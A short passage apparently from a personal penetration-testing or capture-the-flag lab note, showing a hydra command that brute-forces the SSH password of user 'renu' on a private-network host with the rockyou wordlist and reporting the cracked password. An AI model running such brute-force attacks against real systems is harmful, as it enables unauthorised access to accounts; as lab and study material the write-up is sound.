Assuming that we have a username `renu` and the password is too weak, we can try to bruteforce the password using the `rockyou` password file using the `SSH` service.

```
$sudo hydra -l renu -P /home/pranavarao/Pranava__Rao/Tools/Word-List/rockyou.txt ssh://192.168.0.7
```

We found the password of the user! The password is `987654321`, we can try to [[SSH]] into the machine.
